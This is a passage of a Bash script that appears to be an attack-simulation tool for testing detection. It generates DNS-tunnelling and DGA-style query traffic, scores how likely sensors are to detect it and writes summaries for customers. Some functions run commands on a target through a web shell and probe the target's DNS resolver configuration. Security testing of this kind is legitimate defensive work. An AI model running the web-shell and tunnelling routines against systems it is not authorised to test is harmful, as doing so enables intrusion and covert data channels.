                resp=$((resp + 1))
                case "${line}" in
                    *result=nxdomain*) nx=$((nx + 1)) ;;
                    *result=resolved*) resolved=$((resolved + 1)) ;;
                    *result=timeout*) timeout=$((timeout + 1)) ;;
                    *result=error*) error=$((error + 1)) ;;
                esac
                log_dns_tunnel_query_telemetry "${line}"
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_QUERY_(GENERATED|SENT|RESPONSE)' || true)"
    if (( gen + sent + resp == 0 )); then
        return 1
    fi
    case "${scope}" in
        dga)
            DGA_QUERY_GENERATED=$((DGA_QUERY_GENERATED + gen))
            DGA_QUERY_SENT_COUNT=$((DGA_QUERY_SENT_COUNT + sent))
            DGA_QUERY_RESPONDED_COUNT=$((DGA_QUERY_RESPONDED_COUNT + resp))
            DGA_ACTUAL_DNS_QUERIES="${DGA_QUERY_RESPONDED_COUNT}"
            DGA_ACTUAL_NXDOMAIN=$((DGA_ACTUAL_NXDOMAIN + nx))
            (( random > 0 )) && DGA_ACTUAL_RANDOM_DOMAINS=$((DGA_ACTUAL_RANDOM_DOMAINS + random))
            ;;
        *)
            DNS_QUERY_GENERATED=$((DNS_QUERY_GENERATED + gen))
            DNS_QUERY_SENT_COUNT=$((DNS_QUERY_SENT_COUNT + sent))
            DNS_QUERY_RESPONDED_COUNT=$((DNS_QUERY_RESPONDED_COUNT + resp))
            DNS_TUNNEL_ACTUAL_DNS_QUERIES="${DNS_QUERY_RESPONDED_COUNT}"
            DNS_TUNNEL_ACTUAL_TXT_QUERIES=$((DNS_TUNNEL_ACTUAL_TXT_QUERIES + txt))
            DNS_TUNNEL_ACTUAL_NXDOMAIN=$((DNS_TUNNEL_ACTUAL_NXDOMAIN + nx))
            ;;
    esac
    return 0
}

apply_dns_actual_counts_for_judgment() {
    local responded=$(safe_int "${DNS_QUERY_RESPONDED_COUNT:-0}")
    local sent=$(safe_int "${DNS_QUERY_SENT_COUNT:-0}")
    local internal=$(safe_int "${DNS_QUERIES_ATTEMPTED:-0}")
    if (( responded > 0 )); then
        DNS_QUERIES_ATTEMPTED="${responded}"
        DNS_RESPONSES_RECEIVED="${responded}"
        DNS_TUNNEL_SUCCESS_COUNT="${responded}"
        (( DNS_TUNNEL_NXDOMAIN_COUNT == 0 && DNS_TUNNEL_ACTUAL_NXDOMAIN > 0 )) && DNS_TUNNEL_NXDOMAIN_COUNT="${DNS_TUNNEL_ACTUAL_NXDOMAIN}"
        (( DNS_TXT_QUERIES == 0 && DNS_TUNNEL_ACTUAL_TXT_QUERIES > 0 )) && DNS_TXT_QUERIES="${DNS_TUNNEL_ACTUAL_TXT_QUERIES}"
    elif (( sent > 0 )); then
        DNS_QUERIES_ATTEMPTED="${sent}"
    fi
    if (( internal > 0 && responded > 0 && internal != responded )); then
        DNS_INTERNAL_VS_ACTUAL_MISMATCH=yes
    fi
}

apply_dga_actual_counts_for_judgment() {
    local responded=$(safe_int "${DGA_QUERY_RESPONDED_COUNT:-0}")
    local sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
    local internal=$(safe_int "${DGA_TOTAL_QUERIES:-0}")
    if (( responded > 0 )); then
        DGA_TOTAL_QUERIES="${responded}"
        DGA_NXDOMAIN_COUNT="${DGA_ACTUAL_NXDOMAIN}"
        DGA_QUERIES_ATTEMPTED="${responded}"
        DGA_QUERIES_SENT="${sent}"
    elif (( sent > 0 )); then
        DGA_QUERIES_SENT="${sent}"
    fi
    if (( internal > 0 && responded > 0 && internal != responded )); then
        DGA_INTERNAL_VS_ACTUAL_MISMATCH=yes
    fi
}

log_dns_query_pipeline_summary() {
    local module="$1" result="${2:-n/a}"
    local msg="DNS_QUERY_PIPELINE_SUMMARY module=${module} query_generated=${DNS_QUERY_GENERATED:-${DGA_QUERY_GENERATED:-0}} query_sent=${DNS_QUERY_SENT_COUNT:-${DGA_QUERY_SENT_COUNT:-0}} query_responded=${DNS_QUERY_RESPONDED_COUNT:-${DGA_QUERY_RESPONDED_COUNT:-0}} internal_queries=${DNS_QUERIES_ATTEMPTED:-${DGA_TOTAL_QUERIES:-0}} actual_dns_queries=${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-${DGA_ACTUAL_DNS_QUERIES:-0}} server_observed=${DNS_SERVER_OBSERVED_QUERIES:-${DGA_SERVER_OBSERVED_QUERIES:-0}} mismatch=${DNS_INTERNAL_VS_ACTUAL_MISMATCH:-${DGA_INTERNAL_VS_ACTUAL_MISMATCH:-no}} result=${result}"
    state_append "dns_query_pipeline_summary.log" "${msg}"
    dns_tunnel_log_both "${msg}"
    dga_simulation_log_both "${msg}"
}

dns_reconcile_attempted_accounting() {
    local enh fb path_total sim_attempted total responded
    responded=$(safe_int "${DNS_QUERY_RESPONDED_COUNT:-0}")
    if (( responded > 0 )); then
        DNS_QUERIES_ATTEMPTED="${responded}"
        DNS_RESPONSES_RECEIVED="${responded}"
        DNS_TUNNEL_SUCCESS_COUNT="${responded}"
        return 0
    fi
    enh=$(safe_int "${DNS_TUNNEL_ENH_ATTEMPTED:-0}")
    fb=$(safe_int "${DNS_TUNNEL_FB_ATTEMPTED:-0}")
    sim_attempted=$(safe_int "${DNS_QUERIES_ATTEMPTED:-0}")
    path_total=$((enh + fb))
    if (( path_total > 0 )); then
        total="${path_total}"
    elif (( sim_attempted > 0 )); then
        total="${sim_attempted}"
    else
        total=0
    fi
    DNS_QUERIES_ATTEMPTED="${total}"
    if (( total == 0 )); then
        DNS_TUNNEL_UNIQUE_QUERIES=0
        DNS_RESPONSES_RECEIVED=0
        DNS_TUNNEL_SUCCESS_COUNT=0
        DNS_TUNNEL_NXDOMAIN_COUNT=0
        DNS_TUNNEL_RESOLVED_COUNT=0
        DNS_TUNNEL_TIMEOUT_COUNT=0
        DNS_TUNNEL_ERROR_COUNT=0
        return 1
    fi
    return 0
}

dns_apply_dry_run_enhanced_synthetic() {
    local planned_count="$1" infra="$2" txt="$3"
    planned_count=$(safe_int "${planned_count}")
    (( planned_count < 1 )) && return 1
    infra=$(safe_int "${infra}")
    txt=$(safe_int "${txt}")
    DNS_TUNNEL_ENH_ATTEMPTED="${planned_count}"
    DNS_TUNNEL_ENH_SUCCESS="${planned_count}"
    DNS_TUNNEL_ENH_FAIL=0
    DNS_TUNNEL_ENH_NX=$((planned_count * 7 / 10))
    DNS_TUNNEL_ENH_TIMEOUT=0
    DNS_TUNNEL_ENH_RESULT="success"
    DNS_TUNNEL_ENH_REASON="dry_run_synthetic"
    DNS_TUNNEL_FB_USED="no"
    DNS_TUNNEL_FB_ATTEMPTED=0
    DNS_TUNNEL_FB_SUCCESS=0
    DNS_TUNNEL_FB_RESULT="skipped"
    DNS_TUNNEL_FB_REASON="enhanced_dry_run"
    DNS_QUERIES_ATTEMPTED="${planned_count}"
    DNS_TUNNEL_UNIQUE_QUERIES="${planned_count}"
    DNS_RESPONSES_RECEIVED="${planned_count}"
    DNS_TUNNEL_SUCCESS_COUNT="${planned_count}"
    DNS_A_QUERIES=$((infra * 2 / 3))
    DNS_TXT_QUERIES=$((infra / 3 + txt))
    DNS_EFFECTIVE_TLD_COUNT="${planned_count}"
    DNS_TOTAL_ENTROPY_STYLE_COUNT=$((planned_count * 30 / 100))
    DNS_TUNNEL_APPROX_ENTROPY="${DNS_TOTAL_ENTROPY_STYLE_COUNT}"
    DNS_TUNNEL_FINAL_RESULT="success"
    DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="enhanced"
    DNS_TUNNEL_FINAL_REASON="dry_run_synthetic"
    DNS_QUERY_GENERATED="${planned_count}"
    DNS_QUERY_SENT_COUNT="${planned_count}"
    DNS_QUERY_RESPONDED_COUNT="${planned_count}"
    DNS_TUNNEL_ACTUAL_DNS_QUERIES="${planned_count}"
    DNS_TUNNEL_ACTUAL_TXT_QUERIES="${txt}"
    DNS_TUNNEL_ACTUAL_NXDOMAIN="${DNS_TUNNEL_ENH_NX}"
    DNS_SENSOR_EXPECTED_VISIBILITY="HIGH"
    dns_reconcile_attempted_accounting || true
    return 0
}

dns_tunnel_meets_detection_success() {
    local entropy=$(safe_int "${DNS_TUNNEL_APPROX_ENTROPY:-0}")
    local unique=$(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES:-0}")
    local sent=$(safe_int "${DNS_QUERY_SENT_COUNT:-0}")
    local responded=$(safe_int "${DNS_QUERY_RESPONDED_COUNT:-0}")
    local attempted=$(safe_int "${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-${responded}}")
    (( attempted < 1 )) && attempted="${sent}"
    local likelihood="${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"
    if (( sent < 150 || unique < 1 )); then
        DNS_TUNNEL_DETECTION_REASON="${DNS_TUNNEL_DETECTION_REASON:-insufficient_actual_dns_queries_sent sent=${sent} unique=${unique}}"
        return 1
    fi
    if (( entropy < 1 )); then
        DNS_TUNNEL_DETECTION_REASON="entropy_score=0 insufficient_tunnel_entropy"
        DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
        return 1
    fi
    if [[ "${DNS_SENSOR_EXPECTED_VISIBILITY:-LOW}" != HIGH ]]; then
        DNS_TUNNEL_DETECTION_REASON="sensor_expected_visibility=${DNS_SENSOR_EXPECTED_VISIBILITY:-LOW}"
        return 1
    fi
    if [[ "${likelihood}" == LOW ]]; then
        DNS_TUNNEL_DETECTION_REASON="${DNS_TUNNEL_DETECTION_REASON:-detection_likelihood=LOW}"
        return 1
    fi
    return 0
}

log_dns_tunnel_final_summary() {
    local result="$1"
    apply_dns_actual_counts_for_judgment
    finalize_dns_server_query_observation "${DNS_TUNNEL_SELECTED_RESOLVER:-${DNS_TARGET_SERVER}}" "${DNS_QUERIES_ATTEMPTED:-0}" "${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-${DNS_QUERY_RESPONDED_COUNT:-0}}" "DNS" || true
    log_dns_query_pipeline_summary "DNS_TUNNEL" "${result}"
    if ! dns_reconcile_attempted_accounting; then
        [[ "${result}" == skipped || "${DNS_TUNNEL_ENH_RESULT}" == skipped ]] && result="skipped" || result="failed"
        DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
        if (( $(safe_int "${DNS_QUERIES_PLANNED:-0}") > 0 )); then
            poc_log_root_cause_analysis "DNS" "${DNS_TUNNEL_LAST_REMOTE_PAYLOAD:-}" "${DNS_TUNNEL_LAST_REMOTE_OUT:-}"
        fi
    elif [[ "${result}" == success && $(safe_int "${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-${DNS_QUERY_RESPONDED_COUNT:-0}}") -lt 1 ]]; then
        result="failed"
        DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_SKIP_REASON:-zero_actual_dns_responses responded=${DNS_QUERY_RESPONDED_COUNT:-0} internal=${DNS_QUERIES_ATTEMPTED:-0}}"
    elif [[ "${result}" == success && $(safe_int "${DNS_QUERIES_ATTEMPTED}") -lt 1 ]]; then
        result="failed"
    elif [[ "${result}" == success && $(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES}") -lt 1 ]]; then
        result="failed"
        DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_SKIP_REASON:-unique_queries=0 attempted=${DNS_QUERIES_ATTEMPTED:-0}}"
    elif [[ "${result}" == success ]] && ! dns_tunnel_meets_detection_success; then
        result="partial"
        DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_DETECTION_REASON:-detection_criteria_not_met}"
    fi
    log_dns_tunnel_statistics
    dns_compute_tunnel_detection_likelihood
    if [[ "${result}" == success ]] && ! dns_tunnel_meets_detection_success; then
        result="partial"
    fi
    local avg_fqdn=0 avg_label=0 max_label=0 queries="${DNS_QUERIES_ATTEMPTED:-0}"
    queries=$(safe_int "${queries}")
    if (( queries > 0 && DNS_TUNNEL_FQDN_LEN_SUM > 0 )); then
        avg_fqdn=$((DNS_TUNNEL_FQDN_LEN_SUM / queries))
    fi
    if (( DNS_TUNNEL_LABEL_COUNT > 0 && DNS_TUNNEL_LABEL_LEN_SUM > 0 )); then
        avg_label=$((DNS_TUNNEL_LABEL_LEN_SUM / DNS_TUNNEL_LABEL_COUNT))
    fi
    max_label=$(safe_int "${DNS_TUNNEL_LABEL_LEN_MAX:-0}")
    local root_cause_suffix=""
    [[ "${result}" == failed && -n "${DNS_TUNNEL_LAST_ROOT_CAUSE:-}" ]] && root_cause_suffix=" root_cause=${DNS_TUNNEL_LAST_ROOT_CAUSE}"
    local msg="DNS_TUNNEL_FINAL_SUMMARY selected_resolver=${DNS_TUNNEL_SELECTED_RESOLVER:-${DNS_TARGET_SERVER:-n/a}} resolver_source=${DNS_TUNNEL_RESOLVER_SOURCE:-${DNS_TARGET_SELECTION_SOURCE:-unknown}} planned=${DNS_QUERIES_PLANNED:-0} attempted=${DNS_QUERIES_ATTEMPTED:-0} enhanced_attempted=${DNS_TUNNEL_ENH_ATTEMPTED:-0} fallback_attempted=${DNS_TUNNEL_FB_ATTEMPTED:-0} enhanced_result=${DNS_TUNNEL_ENH_RESULT:-skipped} fallback_result=${DNS_TUNNEL_FB_RESULT:-skipped} queries=${DNS_QUERIES_ATTEMPTED:-0} unique_queries=${DNS_TUNNEL_UNIQUE_QUERIES:-0} query_generated=${DNS_QUERY_GENERATED:-0} query_sent=${DNS_QUERY_SENT_COUNT:-0} query_responded=${DNS_QUERY_RESPONDED_COUNT:-0} generated_queries=${DNS_QUERY_GENERATED:-0} actual_dns_queries_sent=${DNS_QUERY_SENT_COUNT:-0} actual_dns_responses=${DNS_QUERY_RESPONDED_COUNT:-0} actual_dns_queries=${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-0} actual_txt_queries=${DNS_TUNNEL_ACTUAL_TXT_QUERIES:-0} actual_unique_queries=${DNS_TUNNEL_UNIQUE_QUERIES:-0} actual_nxdomain=${DNS_TUNNEL_ACTUAL_NXDOMAIN:-0} resolver_validation_result=${DNS_RESOLVER_VALIDATION_RESULT:-failed} sensor_expected_visibility=${DNS_SENSOR_EXPECTED_VISIBILITY:-LOW} server_observed=${DNS_SERVER_OBSERVED_QUERIES:-0} internal_mismatch=${DNS_INTERNAL_VS_ACTUAL_MISMATCH:-no} avg_fqdn_length=${avg_fqdn} avg_label_length=${avg_label} max_label_length=${max_label} a_queries=${DNS_A_QUERIES:-0} txt_queries=${DNS_TXT_QUERIES:-0} nxdomain=${DNS_TUNNEL_NXDOMAIN_COUNT:-0} resolved=${DNS_TUNNEL_RESOLVED_COUNT:-0} timeout=${DNS_TUNNEL_TIMEOUT_COUNT:-0} error=${DNS_TUNNEL_ERROR_COUNT:-0} entropy_score=${DNS_TUNNEL_APPROX_ENTROPY:-0} detection_likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW} payload_bytes=${DNS_TUNNEL_LAST_PAYLOAD_BYTES:-0} webshell_method=${DNS_TUNNEL_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}} result=${result}${root_cause_suffix}"
    state_append "dns_tunnel_final_summary.log" "${msg}"
    dns_tunnel_log_both "${msg}"
}

dns_compute_tunnel_detection_likelihood() {
    local entropy="${DNS_TUNNEL_APPROX_ENTROPY:-0}" unique="${DNS_TUNNEL_UNIQUE_QUERIES:-0}"
    local a="${DNS_A_QUERIES:-0}" txt="${DNS_TXT_QUERIES:-0}"
    local enh_attempted=$(safe_int "${DNS_TUNNEL_ENH_ATTEMPTED:-0}")
    local fb_attempted=$(safe_int "${DNS_TUNNEL_FB_ATTEMPTED:-0}")
    entropy=$(safe_int "${entropy}")
    unique=$(safe_int "${unique}")
    a=$(safe_int "${a}")
    txt=$(safe_int "${txt}")
    DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
    DNS_TUNNEL_DETECTION_REASON="simple_repetitive_queries entropy=${entropy} unique=${unique}"
    if (( entropy < 1 )); then
        DNS_TUNNEL_DETECTION_REASON="entropy_score=0 insufficient_tunnel_characteristics"
        return 0
    fi
    if (( enh_attempted == 0 && fb_attempted > 0 )); then
        DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
        DNS_TUNNEL_DETECTION_REASON="fallback_only_nxdomain_burst enhanced_attempted=0 fallback_attempted=${fb_attempted}"
        (( fb_attempted >= 100 && unique > 50 )) && {
            DNS_TUNNEL_DETECTION_LIKELIHOOD="MEDIUM"
            DNS_TUNNEL_DETECTION_REASON="fallback_only_repetitive_queries fallback_attempted=${fb_attempted}"
        }
        return 0
    fi
    if (( entropy >= 45 && unique > 100 && a > 0 && txt > 0 )); then
        DNS_TUNNEL_DETECTION_LIKELIHOOD="HIGH"
        DNS_TUNNEL_DETECTION_REASON="entropy>${entropy}/10 unique>${unique} TXT+A_mixed"
        return 0
    fi
    if (( entropy >= 30 && unique > 50 )); then
        DNS_TUNNEL_DETECTION_LIKELIHOOD="MEDIUM"
        DNS_TUNNEL_DETECTION_REASON="entropy>${entropy}/10 unique>${unique}"
        return 0
    fi
}

log_dns_tunnel_statistics() {
    local avg_len=0 avg_label=0 max_label=0 queries="${DNS_QUERIES_ATTEMPTED:-0}"
    queries=$(safe_int "${queries}")
    if (( queries > 0 && DNS_TUNNEL_FQDN_LEN_SUM > 0 )); then
        avg_len=$((DNS_TUNNEL_FQDN_LEN_SUM / queries))
    elif (( DNS_TUNNEL_FQDN_COUNT > 0 )); then
        avg_len=$((DNS_TUNNEL_FQDN_LEN_SUM / DNS_TUNNEL_FQDN_COUNT))
    fi
    if (( DNS_TUNNEL_LABEL_COUNT > 0 && DNS_TUNNEL_LABEL_LEN_SUM > 0 )); then
        avg_label=$((DNS_TUNNEL_LABEL_LEN_SUM / DNS_TUNNEL_LABEL_COUNT))
    fi
    max_label=$(safe_int "${DNS_TUNNEL_LABEL_LEN_MAX:-0}")
    local msg="DNS_TUNNEL_STATISTICS queries=${queries} unique_queries=${DNS_TUNNEL_UNIQUE_QUERIES:-0} average_length=${avg_len} avg_fqdn_length=${avg_len} avg_label_length=${avg_label} max_label_length=${max_label} entropy_score=${DNS_TUNNEL_APPROX_ENTROPY:-0} txt_queries=${DNS_TXT_QUERIES:-0} a_queries=${DNS_A_QUERIES:-0} nxdomain=${DNS_TUNNEL_NXDOMAIN_COUNT:-0} resolved=${DNS_TUNNEL_RESOLVED_COUNT:-0} detection_likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"
    state_append "dns_tunnel_statistics.log" "${msg}"
    dns_tunnel_log_both "${msg}"
}

emit_poc_customer_explanation() {
    local block=""
    block="CUSTOMER_EXPLANATION
ICMP Tunnel:
- Generated ${ICMP_PACKETS_ATTEMPTED:-0} packets
- Average payload ${ICMP_PAYLOAD_SIZE_AVG:-0} bytes
- ${ICMP_LARGE_PAYLOAD_RATIO:-0}% exceeded normal size threshold
- Detection likelihood ${ICMP_DETECTION_LIKELIHOOD:-LOW}

DNS Tunnel:
- Generated ${DNS_QUERIES_ATTEMPTED:-0} DNS queries
- Average entropy $(awk -v e="${DNS_TUNNEL_APPROX_ENTROPY:-0}" 'BEGIN{printf "%.1f", e/10}')
- ${DNS_TUNNEL_UNIQUE_QUERIES:-0} unique subdomains
- Detection likelihood ${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}

DGA:
- Generated ${DGA_GENERATED_COUNT:-${DGA_TOTAL_QUERIES:-0}} domains
- ${DGA_NXDOMAIN_COUNT:-0} NXDOMAIN
- Entropy $(awk -v e="${DGA_ENTROPY_SCORE:-0}" 'BEGIN{printf "%.1f", e/10}')
- Detection likelihood ${DGA_DETECTION_LIKELIHOOD:-LOW}"
    state_append "customer_explanation.log" "${block//$'\n'/ ; }"
    log_message "OK" "CUSTOMER_EXPLANATION emitted (ICMP/DNS/DGA telemetry summary for operator review)"
    if declare -F poc_customer_emit_block >/dev/null 2>&1; then
        poc_customer_emit_block "${block}"
    fi
}

dns_tunnel_map_selection_source() {
    case "${1:-}" in
        scan) printf '%s' "target_dns" ;;
        resolver|systemd-resolved) printf '%s' "system_resolver" ;;
        user) printf '%s' "operator_dns" ;;
        fallback) printf '%s' "fallback" ;;
        *) printf '%s' "${1:-unknown}" ;;
    esac
}

log_webshell_post_test() {
    local http_code="$1" body_contains_marker="$2" exit_code="$3" result="$4" reason="$5"
    local msg="WEBSHELL_POST_TEST url=${WEB_SHELL_URL} http_code=${http_code} body_contains_marker=${body_contains_marker} exit_code=${exit_code} result=${result} reason=${reason}"
    state_append "webshell_post_test.log" "${msg}"
    append_dns_tunnel_wave_log "${msg}"
    log_message "OK" "${msg}" >&2
}

validate_webshell_post_exec() {
    local saved_method="${WEBSHELL_METHOD}" wrapped raw_body http_code="${WEBSHELL_LAST_HTTP_CODE:-000}"
    local exit_code="" body_contains_marker=no result=fail reason=""
    if [[ "${DRY_RUN}" == true ]]; then
        log_webshell_post_test "200" yes 0 success dry-run
        return 0
    fi
    WEBSHELL_METHOD=POST
    wrapped=$(wrap_remote_payload "echo POST_EXEC_OK" "quick")
    raw_body=$(webshell_curl_transport "${wrapped}" 12)
    http_code="${WEBSHELL_LAST_HTTP_CODE:-000}"
    WEBSHELL_METHOD="${saved_method}"
    [[ "${raw_body}" == *"POST_EXEC_OK"* ]] && body_contains_marker=yes
    if [[ "${raw_body}" == *"__EXIT_CODE:"* ]]; then
        exit_code=$(sed -n 's/.*__EXIT_CODE:\([0-9][0-9]*\).*/\1/p' <<< "${raw_body}" | tail -n1)
    fi
    if [[ -z "${raw_body}" ]]; then
        reason=empty_response
    elif [[ -z "${http_code}" || "${http_code}" == "000" ]]; then
        reason=timeout
    elif [[ ! "${http_code}" =~ ^2[0-9][0-9]$ ]]; then
        reason=http_not_2xx
    elif [[ "${body_contains_marker}" != yes ]]; then
        reason=marker_missing
    elif [[ -z "${exit_code}" ]]; then
        reason=exit_code_missing
    elif [[ "${exit_code}" != "0" ]]; then
        reason=exit_code_nonzero
    else
        result=success
        reason=ok
    fi
    log_webshell_post_test "${http_code}" "${body_contains_marker}" "${exit_code:-}" "${result}" "${reason}"
    [[ "${result}" == success ]]
}

generate_dns_safe_random_label() {
    local min_len="${1:-16}" max_len="${2:-48}" style="${3:-base32}" out="" span
    min_len=$(safe_int "${min_len}")
    max_len=$(safe_int "${max_len}")
    (( max_len < min_len )) && max_len="${min_len}"
    span=$((max_len - min_len + 1))
    (( span < 1 )) && span=1
    local want=$((min_len + RANDOM % span))
    if command -v openssl >/dev/null 2>&1; then
        if [[ "${style}" == base32 ]]; then
            out=$(openssl rand -base32 "$((want + 8))" 2>/dev/null | tr -dc 'A-Z2-7' | head -c "${want}")
        else
            out=$(openssl rand -base64 "$((want + 8))" 2>/dev/null | tr '+/=' '-_' | tr -dc 'A-Za-z0-9_-' | head -c "${want}")
        fi
        if [[ -z "${out}" ]]; then
            out=$(openssl rand -hex "$((want / 2 + 4))" 2>/dev/null | tr -dc 'a-f0-9' | head -c "${want}")
        fi
    fi
    if [[ -z "${out}" && -r /dev/urandom ]]; then
        out=$(head -c "$((want * 2))" /dev/urandom 2>/dev/null | base64 2>/dev/null | tr '+/=' '-_' | tr -dc 'A-Za-z0-9_-' | head -c "${want}")
    fi
    if [[ -z "${out}" ]] && command -v python3 >/dev/null 2>&1; then
        out=$(python3 -c "import random,string; print(''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(${want})))" 2>/dev/null)
    fi
    if [[ -z "${out}" ]]; then
        out="poc${RANDOM}${RANDOM}$(date +%s | tail -c 6)"
    fi
    out=$(printf '%s' "${out}" | tr -cd 'A-Za-z0-9_-' | head -c 63)
    while (( ${#out} < min_len )); do
        out="${out}$(printf '%x' $((RANDOM % 16)))"
    done
    printf '%s' "${out}"
}

generate_cluster_local_queries() {
    local count="${1:-120}" i ns="poc-lab" svc suffix fqdn
    local -a services=(
        "elasticsearch-cluster"
        "cv-svc-poc-lab-softwaremanagement-v1-repositoryconfigservice"
        "cv-svc-poc-lab-studio-topology-v1-decommissionservice"
        "cv-svc-poc-lab-systemauth-v1-credentialservice"
        "cv-svc-poc-lab-configlet-v1-configletservice"
        "telemetry-sync-v1-statestoreservice"
        "inventory-api-v2-catalogservice"
    )
    local -a namespaces=("default" "kube-system" "poc-lab")
    count=$(safe_int "${count}")
    (( count < 1 )) && count=120
    for ((i = 0; i < count; i++)); do
        svc="${services[i % ${#services[@]}]}"
        ns="${namespaces[i % ${#namespaces[@]}]}"
        suffix=$(generate_dns_safe_random_label 4 8 base32)
        fqdn="${svc}-${suffix}.${ns}.svc.${ns}.cluster.local"
        printf '%s A\n' "${fqdn}"
    done
}

generate_infrastructure_queries() {
    local count="${1:-100}" domain="${2:-${DNS_TUNNEL_DOMAIN_SUFFIX}}" i prefix rand_label fqdn qtype
    local -a prefixes=("rpc-provenance" "rpc-akash" "rpc-secret" "rpc-dymension" "kcr-lambda")
    count=$(safe_int "${count}")
    (( count < 1 )) && count=100
    domain="${domain:-poc-dns-test.local}"
    for ((i = 0; i < count; i++)); do
        prefix="${prefixes[i % ${#prefixes[@]}]}"
        rand_label=$(generate_dns_safe_random_label 10 20 base32)
        fqdn="${prefix}.${rand_label}.${domain}"
        if (( i % 3 == 1 )); then
            qtype="TXT"
        else
            qtype="A"
        fi
        printf '%s %s\n' "${fqdn}" "${qtype}"
    done
}

generate_txt_burst_queries() {
    local count="${1:-50}" domain="${2:-${DNS_TUNNEL_DOMAIN_SUFFIX}}" i chunk1 chunk2 chunk3 fqdn
    count=$(safe_int "${count}")
    (( count < 30 )) && count=30
    domain="${domain:-poc-dns-test.local}"
    for ((i = 0; i < count; i++)); do
        chunk1=$(generate_dns_safe_random_label 50 60 base64url)
        chunk2=$(generate_dns_safe_random_label 50 60 base32)
        chunk3=$(generate_dns_safe_random_label 8 16 base32)
        fqdn="${chunk1}.${chunk2}.${chunk3}.${domain}"
        if (( ${#fqdn} > 253 )); then
            fqdn="${chunk1:0:55}.${chunk3}.${domain}"
        fi
        printf '%s TXT\n' "${fqdn}"
    done
}

discover_dns_servers_from_scan() {
    collect_dns_tunnel_targets
}

dns_resolver_is_stub() {
    case "${1:-}" in
        127.0.0.53) return 0 ;;
        *) return 1 ;;
    esac
}

build_discover_dns_upstream_remote_cmd() {
    remote_bash_script_open 'DNS_UPSTREAM_SCRIPT'
    cat <<EOF
${REMOTE_SHELL_HELPERS}
stub=""
source="unknown"
upstream=""
upstream_all=""
if [ -f /etc/resolv.conf ]; then
  stub=\$(awk '/^nameserver[[:space:]]+/ {print \$2; exit}' /etc/resolv.conf 2>/dev/null)
fi
collect_resolvers() {
  awk '{
    for (i = 1; i <= NF; i++) {
      if (\$i ~ /^([0-9]{1,3}\.){3}[0-9]{1,3}\$/) print \$i
    }
  }' | sort -u
}
filter_stub() {
  grep -Ev '^127\\.0\\.0\\.53\$' || true
}
if command -v resolvectl >/dev/null 2>&1; then
  source="systemd-resolved"
  upstream_all=\$(
    {
      resolvectl dns 2>/dev/null
      resolvectl status 2>/dev/null
    } | collect_resolvers | filter_stub | paste -sd',' -
  )
elif [ -f /etc/resolv.conf ]; then
  source="resolv.conf"
  upstream_all=\$(awk '/^nameserver[[:space:]]+/ {print \$2}' /etc/resolv.conf 2>/dev/null | filter_stub | paste -sd',' -)
fi
if command -v powershell >/dev/null 2>&1; then
  win_dns=\$(powershell -NoProfile -Command "(Get-DnsClientServerAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ServerAddresses | Where-Object { \$_ -ne '127.0.0.53' } | Select-Object -First 1)" 2>/dev/null | tr -d '\\r')
  if [ -n "\${win_dns}" ]; then
    [ -z "\${upstream_all}" ] && upstream_all="\${win_dns}" || upstream_all="\${upstream_all},\${win_dns}"
    [ "\${source}" = "unknown" ] && source="windows-dns-client"
  fi
elif command -v ipconfig >/dev/null 2>&1; then
  win_dns=\$(ipconfig /all 2>/dev/null | awk -F': *' '/DNS Servers/ {gsub(/[^0-9.]/," ",\$2); for(i=1;i<=NF;i++) if(\$i ~ /^([0-9]{1,3}\\.){3}[0-9]{1,3}\$/ && \$i != "127.0.0.53") {print \$i; exit}}')
  if [ -n "\${win_dns}" ]; then
    [ -z "\${upstream_all}" ] && upstream_all="\${win_dns}" || upstream_all="\${upstream_all},\${win_dns}"
    [ "\${source}" = "unknown" ] && source="windows-ipconfig"
  fi
fi
if [ -n "\${upstream_all}" ]; then
  upstream="\${upstream_all%%,*}"
fi
printf 'DNS_RESOLVER_PROBE resolver_source=%s stub_resolver=%s upstream_dns=%s upstream_all=%s\\n' \\
  "\${source}" "\${stub:-}" "\${upstream:-}" "\${upstream_all:-}"
EOF
    remote_bash_script_close 'DNS_UPSTREAM_SCRIPT'
}

parse_dns_resolver_probe_line() {
    local out="$1" line=""
    local resolver_source="" stub_resolver="" upstream_dns="" upstream_all=""
    line=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E 'DNS_RESOLVER_PROBE' | tail -n1 || true)
    [[ -n "${line}" ]] || return 1
    resolver_source=$(dns_stats_field_from_line "${line}" resolver_source)
    stub_resolver=$(dns_stats_field_from_line "${line}" stub_resolver)
    upstream_dns=$(dns_stats_field_from_line "${line}" upstream_dns)
    upstream_all=$(dns_stats_field_from_line "${line}" upstream_all)
    printf '%s %s %s %s\n' "${resolver_source}" "${stub_resolver}" "${upstream_dns}" "${upstream_all}"
}

discover_dns_upstream_from_webshell() {
    local out="" resolver_source="" stub_resolver="" upstream_dns="" upstream_all="" host
    DNS_RESOLVER_SOURCE=""
    DNS_STUB_RESOLVER=""
    DNS_UPSTREAM_DNS=""
    if [[ "${DRY_RUN}" == true ]]; then
        DNS_STUB_RESOLVER="127.0.0.53"
        DNS_RESOLVER_SOURCE="systemd-resolved"
        DNS_UPSTREAM_DNS="10.10.10.5"
        printf '%s\n' "10.10.10.5"
        return 0
    fi
